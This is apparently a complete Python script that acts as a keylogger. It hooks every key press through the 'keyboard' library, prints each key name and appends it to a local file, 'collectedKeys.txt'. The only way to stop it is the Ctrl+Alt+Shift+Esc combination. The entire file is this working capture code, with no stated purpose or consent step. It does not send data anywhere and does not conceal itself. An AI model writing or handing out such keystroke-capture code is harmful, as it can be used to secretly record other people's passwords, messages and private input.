import keyboard
import os

# Define a callback function for key press events
def on_key_press(event):
    # Check if the combination Alt + Shift + Ctrl + Esc is pressed
    if event.name == 'esc' and keyboard.is_pressed('alt') and keyboard.is_pressed('shift') and keyboard.is_pressed('ctrl'):
        keyboard.unhook_all()  # Stop the keyboard listener

    # Print the pressed key
    print(event.name)

    # Save the pressed key to a file
    save_content(event.name, "collectedKeys.txt")

# Function to save content to a file
def save_content(content, filename):
    # Write content to the file
    with open(filename, 'a') as file:  # Use 'a' mode to append content to the file
        file.write(content )

    print(f"Key saved to {filename}")

# Start the keyboard listener
keyboard.on_press(on_key_press)

# Keep the program running until the Alt + Shift + Ctrl + Esc combination is pressed
while True:
    if keyboard.is_pressed('alt') and keyboard.is_pressed('shift') and keyboard.is_pressed('ctrl') and keyboard.is_pressed('esc'):
        break

# The keyboard listener will stop automatically after the combination is pressed
